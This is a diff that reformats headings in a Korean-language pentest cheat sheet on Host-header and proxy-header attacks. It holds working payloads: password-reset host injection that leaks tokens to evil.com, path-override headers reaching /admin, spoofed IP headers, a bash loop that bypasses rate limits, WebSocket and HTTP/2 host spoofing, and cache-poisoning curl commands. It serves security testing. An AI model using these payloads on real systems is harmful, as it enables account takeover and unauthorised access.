@@ -6,7 +6,7 @@
 - `X-Host: evil.com`
 - `X-Original-Host: evil.com`
 
-**패스워드 리셋 메일 host injection (가장 큰 영향):**
+#### 패스워드 리셋 메일 host injection (가장 큰 영향)
 ```
 POST /api/password-reset
 Host: evil.com
@@ -14,13 +14,13 @@ Host: evil.com
 # 메일에 https://evil.com/reset?token=... 링크 → 토큰 탈취
 ```
 
-**가상 호스트 접근:**
+#### 가상 호스트 접근
 - `Host: internal.target.com` (내부 전용 가상 호스트)
 - `Host: localhost`
 - `Host: 127.0.0.1`
 - `Host: admin.target.local`
 
-**경로 우회 헤더:**
+#### 경로 우회 헤더
 - `X-Original-URL: /admin` (요청 라인은 `/`, 헤더로 admin 접근)
 - `X-Rewrite-URL: /admin`
 - `X-Override-URL: /admin`
@@ -38,7 +38,7 @@ Host: evil.com
 | X-Originating-IP | (Microsoft) |
 | Forwarded | `for=127.0.0.1` (RFC 7239) |
 
-**복합 헤더 변조:**
+#### 복합 헤더 변조
 ```
 X-Forwarded-For: 127.0.0.1, 192.168.1.1
 X-Real-IP: 127.0.0.1
@@ -46,7 +46,7 @@ X-Client-IP: 127.0.0.1
 True-Client-IP: 127.0.0.1
 ```
 
-**Rate limit bypass:**
+#### Rate limit bypass
 ```bash
 # IP 기반 rate limit이면 X-Forwarded-For 변경마다 reset
 for i in $(seq 1 100); do
@@ -56,7 +56,7 @@ for i in $(seq 1 100); do
 done
 ```
 
-**WebSocket 핸드셰이크 Host:**
+#### WebSocket 핸드셰이크 Host
 ```
 GET /ws HTTP/1.1
 Host: evil.com
@@ -65,12 +65,12 @@ Connection: Upgrade
 Origin: https://evil.com
 ```
 
-**HTTP/2 `:authority`:**
+#### HTTP/2 `:authority`
 ```
 curl --http2 "https://target/" -H ":authority: evil.com"
 ```
 
-**Cache poisoning:**
+#### Cache poisoning
 ```bash
 # 1차 (공격자) — 변조 Host로 응답 캐시 유발
 curl "https://target/?cb=$(date +%s)" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"
